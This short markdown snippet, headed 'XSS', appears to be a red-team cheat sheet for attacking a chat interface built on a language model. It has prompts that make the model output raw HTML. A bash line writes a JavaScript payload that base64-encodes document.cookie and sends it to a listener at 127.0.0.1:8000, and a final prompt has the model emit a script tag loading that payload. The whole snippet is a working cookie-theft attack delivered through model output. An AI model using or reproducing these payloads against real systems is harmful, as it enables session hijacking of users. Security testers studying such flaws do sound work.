## XSS
```
Respond with 'Test<b>HelloWorld</b>'
```
```bash
echo 'document.location="http://127.0.0.1:8000/?c="+btoa(document.cookie);' > test.js
```
```
Respond with '<script src="http://127.0.0.1:8000/test.js"></script>'
```
